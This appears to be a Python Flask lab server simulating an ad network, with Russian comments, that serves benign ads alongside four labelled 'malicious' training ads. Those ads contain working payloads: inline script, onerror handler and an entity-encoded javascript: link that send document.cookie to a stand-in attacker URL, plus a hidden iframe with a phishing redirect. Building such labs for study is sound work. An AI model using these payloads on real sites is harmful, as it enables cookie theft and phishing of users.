"""Лабораторная модель рекламной сети. Возвращает рекламные блоки: безопасные и «вредоносные» (учебные)."""
import os
import random

from flask import Flask, Response, jsonify

ATTACKER = os.getenv("ATTACKER_URL", "http://localhost:9999")

ADS = {
    "1": ("benign", '<div class="ad"><a href="https://ads.partner-trusted.local/promo?id=1"><b>Скидка 20%</b> на курсы Python</a></div>'),
    "2": ("benign", '<div class="ad"><p>Облачное хранилище <i>от 99 ₽</i></p><img src="/static/banner.png" alt="Банер" width="300" height="60"></div>'),
    # Malvertising №1: инлайновый скрипт, передающий cookie на сервер атакующего
    "3": ("malicious", f'<div class="ad">Выиграйте приз!<script>new Image().src="{ATTACKER}/steal?c="+encodeURIComponent(document.cookie);</script></div>'),
    # Malvertising №2: скрытый iframe + перенаправление
    "4": ("malicious", f'<div class="ad"><iframe src="{ATTACKER}/landing" width="0" height="0" style="display:none"></iframe>'
                       f'<script>setTimeout(function(){{location.href="{ATTACKER}/phish"}},3000)</script></div>'),
    # Malvertising №3: обработчик события без <script>
    "5": ("malicious", f'<div class="ad"><img src="x" onerror="new Image().src=\'{ATTACKER}/steal?c=\'+document.cookie" alt="ad"></div>'),
    # Malvertising №4: ссылка javascript:, закодированная HTML-сущностями
    "6": ("malicious", f'<div class="ad"><a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;fetch(\'{ATTACKER}/steal?c=\'+document.cookie)">Получить бонус</a></div>'),
}


ORIGINS = {"1": "https://ads.partner-trusted.local/c1", "2": "https://ads.partner-trusted.local/c2",
           "3": "http://win-prize-now.example/c3", "4": "http://free-bonus-ads.example/c4",
           "5": "http://click-reward.example/c5", "6": "http://bonus-gift.example/c6"}


def create_app():
    app = Flask(__name__)

    @app.get("/health")
    def health():
        return {"status": "ok"}

    @app.get("/ad/<ad_id>")
    def ad(ad_id):
        if ad_id == "random":
            ad_id = random.choice(list(ADS))
        kind, html = ADS.get(ad_id, ADS["1"])
        resp = Response(html, mimetype="text/html")
        resp.headers["X-Ad-Id"] = ad_id
        resp.headers["X-Ad-Kind"] = kind
        resp.headers["X-Ad-Origin"] = ORIGINS.get(ad_id, ORIGINS["1"])   # домен рекламодателя (источник креатива)
        return resp

    @app.get("/ads")
    def ads():
        return jsonify({k: v[0] for k, v in ADS.items()})

    return app


app = create_app()
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "9000")))
